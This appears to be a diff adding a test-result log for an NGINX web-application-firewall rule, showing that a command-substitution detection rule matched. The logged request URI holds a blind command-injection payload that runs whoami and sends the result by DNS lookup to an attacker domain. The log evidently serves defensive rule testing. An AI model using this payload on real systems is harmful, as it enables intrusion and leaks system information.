@@ -1,0 +1,3 @@
+Expected Rule: [NGINX CMDi] Command substitution attack
+Matched Rule: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_004-1770841818434-n4pvji pattern_id=CMD_BLIND_004 uri=/?q=%3B%20nslookup%20%60whoami%60.attacker.com client=127.0.0.1
+Rule Match: ✅ Match
